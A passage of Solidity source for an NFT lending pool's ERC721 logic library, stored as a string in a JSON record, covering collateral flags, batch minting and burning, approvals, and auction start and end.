(!useAsCollateral) {\n            require(\n                !isAuctioned(erc721Data, POOL, tokenId),\n                Errors.TOKEN_IN_AUCTION\n            );\n        }\n\n        uint64 collateralizedBalance = erc721Data\n            .userState[owner]\n            .collateralizedBalance;\n        erc721Data.isUsedAsCollateral[tokenId] = useAsCollateral;\n        collateralizedBalance = useAsCollateral\n            ? collateralizedBalance + 1\n            : collateralizedBalance - 1;\n        erc721Data\n            .userState[owner]\n            .collateralizedBalance = collateralizedBalance;\n\n        return true;\n    }\n\n    function executeMintMultiple(\n        MintableERC721Data storage erc721Data,\n        bool ATOMIC_PRICING,\n        address to,\n        DataTypes.ERC721SupplyParams[] calldata tokenData\n    )\n        external\n        returns (\n            uint64 oldCollateralizedBalance,\n            uint64 newCollateralizedBalance\n        )\n    {\n        require(to != address(0), \"ERC721: mint to the zero address\");\n        uint64 oldBalance = erc721Data.userState[to].balance;\n        oldCollateralizedBalance = erc721Data\n            .userState[to]\n            .collateralizedBalance;\n        uint256 oldTotalSupply = erc721Data.allTokens.length;\n        uint64 collateralizedTokens = 0;\n\n        for (uint256 index = 0; index < tokenData.length; index++) {\n            uint256 tokenId = tokenData[index].tokenId;\n\n            require(\n                !_exists(erc721Data, tokenId),\n                \"ERC721: token already minted\"\n            );\n\n            _addTokenToAllTokensEnumeration(\n                erc721Data,\n                tokenId,\n                oldTotalSupply + index\n            );\n            _addTokenToOwnerEnumeration(\n                erc721Data,\n                to,\n                tokenId,\n                oldBalance + index\n            );\n\n            erc721Data.owners[tokenId] = to;\n\n            if (\n                tokenData[index].useAsCollateral &&\n                !erc721Data.isUsedAsCollateral[tokenId]\n            ) {\n                erc721Data.isUsedAsCollateral[tokenId] = true;\n                collateralizedTokens++;\n            }\n\n            emit Transfer(address(0), to, tokenId);\n        }\n\n        newCollateralizedBalance =\n            oldCollateralizedBalance +\n            collateralizedTokens;\n        erc721Data\n            .userState[to]\n            .collateralizedBalance = newCollateralizedBalance;\n\n        uint64 newBalance = oldBalance + uint64(tokenData.length);\n        _checkBalanceLimit(erc721Data, ATOMIC_PRICING, newBalance);\n        erc721Data.userState[to].balance = newBalance;\n\n        // calculate incentives\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n        if (address(rewardControllerLocal) != address(0)) {\n            rewardControllerLocal.handleAction(to, oldTotalSupply, oldBalance);\n        }\n\n        return (oldCollateralizedBalance, newCollateralizedBalance);\n    }\n\n    function executeBurnMultiple(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        address user,\n        uint256[] calldata tokenIds\n    )\n        external\n        returns (\n            uint64 oldCollateralizedBalance,\n            uint64 newCollateralizedBalance\n        )\n    {\n        uint64 burntCollateralizedTokens = 0;\n        uint64 balanceToBurn;\n        uint256 oldTotalSupply = erc721Data.allTokens.length;\n        uint256 oldBalance = erc721Data.userState[user].balance;\n        oldCollateralizedBalance = erc721Data\n            .userState[user]\n            .collateralizedBalance;\n\n        for (uint256 index = 0; index < tokenIds.length; index++) {\n            uint256 tokenId = tokenIds[index];\n            address owner = erc721Data.owners[tokenId];\n            require(owner == user, \"not the owner of Ntoken\");\n            require(\n                !isAuctioned(erc721Data, POOL, tokenId),\n                Errors.TOKEN_IN_AUCTION\n            );\n\n            _removeTokenFromAllTokensEnumeration(\n                erc721Data,\n                tokenId,\n                oldTotalSupply - index\n            );\n            _removeTokenFromOwnerEnumeration(\n                erc721Data,\n                user,\n                tokenId,\n                oldBalance - index\n            );\n\n            // Clear approvals\n            _approve(erc721Data, address(0), tokenId);\n\n            balanceToBurn++;\n            delete erc721Data.owners[tokenId];\n\n            if (erc721Data.auctions[tokenId].startTime > 0) {\n                delete erc721Data.auctions[tokenId];\n            }\n\n            if (erc721Data.isUsedAsCollateral[tokenId]) {\n                delete erc721Data.isUsedAsCollateral[tokenId];\n                burntCollateralizedTokens++;\n            }\n            emit Transfer(owner, address(0), tokenId);\n        }\n\n        erc721Data.userState[user].balance -= balanceToBurn;\n        newCollateralizedBalance =\n            oldCollateralizedBalance -\n            burntCollateralizedTokens;\n        erc721Data\n            .userState[user]\n            .collateralizedBalance = newCollateralizedBalance;\n\n        // calculate incentives\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n\n        if (address(rewardControllerLocal) != address(0)) {\n            rewardControllerLocal.handleAction(\n                user,\n                oldTotalSupply,\n                oldBalance\n            );\n        }\n\n        return (oldCollateralizedBalance, newCollateralizedBalance);\n    }\n\n    function executeApprove(\n        MintableERC721Data storage erc721Data,\n        address to,\n        uint256 tokenId\n    ) external {\n        _approve(erc721Data, to, tokenId);\n    }\n\n    function _approve(\n        MintableERC721Data storage erc721Data,\n        address to,\n        uint256 tokenId\n    ) private {\n        erc721Data.tokenApprovals[tokenId] = to;\n        emit Approval(erc721Data.owners[tokenId], to, tokenId);\n    }\n\n    function executeApprovalForAll(\n        MintableERC721Data storage erc721Data,\n        address owner,\n        address operator,\n        bool approved\n    ) external {\n        require(owner != operator, \"ERC721: approve to caller\");\n        erc721Data.operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    function executeStartAuction(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) external {\n        require(\n            !isAuctioned(erc721Data, POOL, tokenId),\n            Errors.AUCTION_ALREADY_STARTED\n        );\n        require(\n            _exists(erc721Data, tokenId),\n            \"ERC721: startAuction for nonexistent token\"\n        );\n        erc721Data.auctions[tokenId] = DataTypes.Auction({\n            startTime: block.timestamp\n        });\n    }\n\n    function executeEndAuction(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) external {\n        require(\n            isAuctioned(erc721Data, POOL, tokenId),\n            Errors.AUCTION_NOT_STARTED\n        );\n        require(\n            _exists(erc721Data, tokenId),\n            \"ERC721: e"
    }
  ]
}